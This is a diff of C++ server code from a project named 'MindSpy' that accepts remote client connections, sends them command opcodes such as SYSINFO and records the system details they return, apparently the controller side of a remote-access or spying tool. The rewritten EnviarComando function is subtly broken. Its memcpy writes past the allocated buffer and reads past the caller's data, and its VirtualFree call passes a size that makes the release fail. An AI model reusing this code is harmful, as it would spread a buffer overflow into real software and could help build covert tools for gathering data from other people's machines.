@@ -52,7 +52,7 @@ namespace MindSpy
 			cout << "Conexion aceptada. IP: " << Conexiones[id].IP << endl;
 			CreateThread(NULL, NULL, &HiloConexionStatic, this, NULL, NULL);
 			while (!Conexiones[id].Activa) Sleep(30);
-			EnviarMensaje(Conexiones[id].IP, "SYSINFO");
+			EnviarComando(Conexiones[id].IP, NULL, CLNT_CMDS::SYSINFO, NULL);
 		}
 	}
 
@@ -67,13 +67,35 @@ namespace MindSpy
 		return IP_NO_REGISTRADA;
 	}
 
-	bool Servidor::EnviarMensaje(const char* IP, const char* Mensaje) {
-		int r = IpRegistrada(IP);
-		if (r != IP_NO_REGISTRADA) {
-			send(Conexiones[r].c_socket, Mensaje, strlen(Mensaje), 0);
-			return true;
-		}
-		return false;
+	bool Servidor::EnviarComando(char* IP, USHORT SizeofData, USHORT comando, BYTE* Data)
+	{
+		/*
+		La estructura de los paquetes a enviar, es siempre la misma, independientemente de
+		los datos a enviar. Sin embargo, el tamaño de dichos datos puede variar.
+
+		Los primeros dos bytes del paquete, corresponden al tamaño del paquete. Los segundos
+		dos bytes corresponden al comando asociado a la data y del quinto byte en adelante,
+		se ubica la data a enviar.
+		*/
+		// Obtener el socket asociado a la IP
+		int res = IpRegistrada(IP);
+		if (res == IP_NO_REGISTRADA)
+			return false;
+
+		// Se reserva memoria para el tamaño de la data + el opcode (comando) + data
+		BYTE *DataToSend = (BYTE*)VirtualAlloc(NULL, SizeofData + 4, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+		// Se mueven a los primeros 2 bytes (unsigned short), el tamaño del paquete
+		*(USHORT*)DataToSend = SizeofData + 4;
+		// Se mueve el comando a los siguientes 2 bytes
+		*(USHORT*)(DataToSend + 2) = comando;
+		// Se copia la data pasada por parámetro a la memoria reservada
+		if (Data) 
+			memcpy(DataToSend + 4, Data, SizeofData + 4);
+		// Se envian los datos
+		bool r = send(Conexiones[res].c_socket, (const char*)DataToSend, SizeofData + 4, 0) != SOCKET_ERROR;
+		// Se libera la memoria
+		VirtualFree(DataToSend, SizeofData, MEM_RELEASE);
+		return r;
 	}
 
 	void Servidor::HiloConexion() {
@@ -95,15 +117,15 @@ namespace MindSpy
 
 			switch (comando)
 			{
-			case SRV_CMDS::CLOSE:
+			case CLNT_CMDS::CLOSE:
 				Conexiones[MyID].Activa = false;
 				break;
 
-			case SRV_CMDS::VERSION:
+			case CLNT_CMDS::VERSION:
 				cout << "Version del cliente: " << &szBuff[4] << endl;
 				break;
 
-			case SRV_CMDS::SYSINFO:
+			case CLNT_CMDS::SYSINFO:
 				Conexiones[MyID].SistemaCliente = *(stSystemInfoResponse*)&szBuff[4];
 				wcout << L"Informacion de cliente recibida." << endl;
 				wcout << L"IP: " << Conexiones[MyID].IP << endl;
